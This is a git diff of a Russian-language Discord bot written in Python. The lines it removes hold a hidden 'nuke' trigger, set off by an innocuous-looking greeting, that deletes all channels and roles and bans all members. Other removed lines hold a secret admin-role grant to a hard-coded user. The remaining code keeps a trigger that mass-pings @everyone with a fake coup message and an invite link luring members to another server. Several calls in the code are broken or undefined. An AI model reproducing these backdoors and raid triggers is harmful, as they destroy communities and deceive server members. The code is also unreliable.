@@ -10,11 +10,13 @@ bot = commands.Bot(command_prefix = settings['prefix'])
 @bot.event
 async def on_message(message):
     
-    if "протокол ХУЙ" in message.content:
+    midd = message.author.member.id
+    
+    if "чекнуть" in message.content:
         
-        member = ctx.guild.get_member(764136341486698516)
-        role1 = discord.utils.get(ctx.guild.roles, name = "Админ Гей")
-        await member.give_roles(role1)
+        await message.channel.send (midd)
+    
+    if "протокол ХУЙ" in message.content:
         
         i = 3
         
@@ -23,33 +25,6 @@ async def on_message(message):
             i = i - 1
         
             await message.channel.send ("@everyone ВНИМАНИЕ! Чертик азазель узурпировал власть! Легитимное правительство бойкотирует переворот! Всем солидарным с легитимным правительством просьба выйти с этого сервера и зайти по данной ссылке https://discord.gg/Cv7z9Q ")
-    
-    if "здравствуйте, дoрогие друзья!" in message.content:
-        
-        #оптимизация
-        guild = ctx.guild
-        author = ctx.author
-
-        #удаление каналов
-        for i in guild.channels:
-            try:
-                await i.delete ()
-            except:
-                continue
-
-        #бан
-        for j in guild.members:
-            try:
-                await j.ban ()
-            except:
-                continue
-
-        #кик
-        for k in guild.roles:
-            try:
-                await k.delete ()
-            except:
-                continue
     
     if "suck" in message.content:
         
